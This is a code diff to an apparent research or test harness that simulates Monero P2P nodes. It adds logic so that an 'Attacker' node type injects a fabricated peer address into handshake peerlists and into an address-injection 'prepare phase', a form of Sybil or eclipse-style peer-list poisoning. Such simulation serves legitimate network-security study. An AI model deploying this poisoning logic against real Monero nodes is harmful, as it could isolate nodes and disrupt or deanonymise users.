@@ -18,6 +18,24 @@
 using namespace sybiltest;
 using namespace std;
 
+// to deal with peerlist
+static nodetool::peerlist_entry create_peerlist_entry(std::string _ip_str, int _port) {
+//    nodetool::peerlist_entry ple;
+
+    std::uint32_t ip = inet_addr(_ip_str.c_str());
+    if(INADDR_NONE == ip)
+    {
+        std::cout << "inet_addr failed" << "\n";
+        exit(-1);
+    }
+    epee::net_utils::ipv4_network_address ipv4_netaddr{ip, (uint16_t)_port};
+
+    epee::net_utils::network_address na{ipv4_netaddr};
+    nodetool::peerlist_entry ple{na};
+    ple.last_seen = 0;
+    return ple;
+}
+
 void MoneroNodePrimitives::OpAfterConnect(int conn_fd) {
     cout << "OpAfterConnect for node [" << GetIP() << "]" << "\n";
     switch (_type) {
@@ -170,6 +188,12 @@ void MoneroNodePrimitives::OpAfterRecv(int data_fd, string recv_str) {
                         rsp.payload_data.cumulative_difficulty = 1;
                         rsp.payload_data.cumulative_difficulty_top64 = 0;
                         rsp.payload_data.pruning_seed = 0;
+
+                        if (_type == NodeType::Attacker) {
+                            // add peer information
+                            nodetool::peerlist_entry ple = create_peerlist_entry("3.0.0.1", 28080);
+                            rsp.local_peerlist_new.push_back(ple);
+                        }
 
                         epee::serialization::portable_storage strg_out;
                         rsp.store(strg_out);
@@ -344,9 +368,12 @@ void MoneroNodePrimitives::OpAddrInjectionTimeout(std::chrono::system_clock::dur
 
     if (now < attack_start_time) {
         // if it's prepare phase
-        int totalIPCount = 1000;
+        int totalIPCount = 1;
         int legiIPcount = totalIPCount * 0.3;
         int unreLegiIPcount = totalIPCount * 0.7;
+
+        nodetool::peerlist_entry ple = create_peerlist_entry("3.0.0.1", 28080);
+        _addr_ip_list.push_back(ple);
 
     } else {
         // if it's attack phase
